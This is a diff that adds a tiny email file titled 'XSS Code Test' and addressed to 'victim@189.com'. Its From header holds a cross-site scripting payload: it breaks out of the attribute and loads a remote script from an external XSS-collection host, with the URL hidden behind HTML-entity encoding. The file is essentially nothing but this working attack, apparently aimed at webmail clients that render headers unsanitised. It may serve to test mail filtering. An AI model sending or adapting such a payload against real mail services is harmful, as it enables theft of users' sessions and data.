@@ -1,0 +1,7 @@
+From: <"><script src="http&#58;&#47;&#47;xss.tw&#47;4091">@attacker.com>
+Subject: XSS Code Test
+To: victim@189.com
+MIME-Version: 1.0
+Content-type: text/html
+
+XSS Code Test
